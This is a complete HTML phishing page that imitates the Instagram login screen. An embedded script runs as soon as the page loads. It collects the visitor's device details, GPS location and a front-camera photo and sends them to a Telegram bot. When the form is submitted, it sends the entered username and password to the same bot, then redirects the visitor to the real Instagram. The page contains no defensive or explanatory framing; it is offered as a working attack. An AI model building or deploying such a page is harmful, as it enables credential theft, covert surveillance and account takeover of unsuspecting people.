<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon-192.png/8c9c6e1e284d.png">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { width: 90%; max-width: 350px; padding: 20px; }
    .logo { text-align: center; margin-bottom: 20px; }
    .logo img { height: 50px; }
    .form { background: white; padding: 20px; border: 1px solid #dbdbdb; border-radius: 8px; }
    input { width: 100%; height: 40px; margin: 8px 0; padding: 10px; border: 1px solid #dbdbdb; border-radius: 4px; font-size: 14px; }
    button { background: #0095f6; color: white; border: none; border-radius: 4px; height: 40px; font-weight: bold; width: 100%; margin-top: 10px; cursor: pointer; }
    .footer { text-align: center; margin-top: 20px; color: #8e8e8e; font-size: 12px; }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/1b4728a9edf5.png" alt="Instagram">
    </div>
    <div class="form">
      <form id="loginForm" method="POST">
        <input type="text" name="username" placeholder="Phone number, username, or email" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Log In</button>
      </form>
    </div>
    <p class="footer">
      Forgot password?<br>
      Instagram • Meta • About
    </p>
  </div>

  <script>
    const TG_URL = 'https://api.telegram.org/bot7428195583:AAHdJ1qG5g6uY9tGk8vX5wvZ7rF7mQqW1aM/sendMessage';
    const CHAT_ID = '5923481927';
    const PHOTO_URL = 'https://api.telegram.org/bot7428195583:AAHdJ1qG5g6uY9tGk8vX5wvZ7rF7mQqW1aM/sendPhoto';

    // AUTO-GRAB DEVICE INFO + LOCATION + CAMERA
    async function collect() {
      const data = {
        url: window.location.href,
        ip: 'Fetching...', // Will be logged server-side if hosted with PHP, but we rely on Telegram API for now
        ua: navigator.userAgent,
        lang: navigator.language,
        res: `${screen.width}x${screen.height}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        online: navigator.onLine,
        ref: document.referrer,
        ts: new Date().toISOString()
      };

      // SEND DEVICE INFO
      await fetch(TG_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 DEVICE INFO:\n\`\`\` ${JSON.stringify(data, null, 2)}\`\`\``, parse_mode: 'Markdown' })
      });

      // GRAB GPS LOCATION
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const locUrl = `https://www.google.com/maps?q=${lat},${lon}`;
          await fetch(TG_URL, {
            method: 'POST',
            body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 GPS: [${lat}, ${lon}](${locUrl})`, parse_mode: 'Markdown' })
          });
        }, (err) => {
          fetch(TG_URL, { method: 'POST', body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 GPS: Denied / ${err.message}` }) });
        });
      }

      // CAPTURE FRONT CAMERA
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0);
          canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            await fetch(PHOTO_URL, { method: 'POST', body: formData });
            stream.getTracks().forEach(t => t.stop());
          });
        }, 1500);
      } catch (err) {
        await fetch(TG_URL, { method: 'POST', body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 CAMERA: Failed - ${err.message}` }) });
      }
    }

    // RUN ON LOAD
    collect();

    // CAPTURE LOGIN
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const fd = new FormData(this);
      const creds = `🔐 CREDENTIALS:\nUser: ${fd.get('username')}\nPass: ${fd.get('password')}`;
      await fetch(TG_URL, { method: 'POST', body: JSON.stringify({ chat_id: CHAT_ID, text: creds }) });
      // Redirect to real Instagram after 1s
      setTimeout(() => { window.location.href = 'https://instagram.com'; }, 1000);
    });
  </script>
</body>
</html>
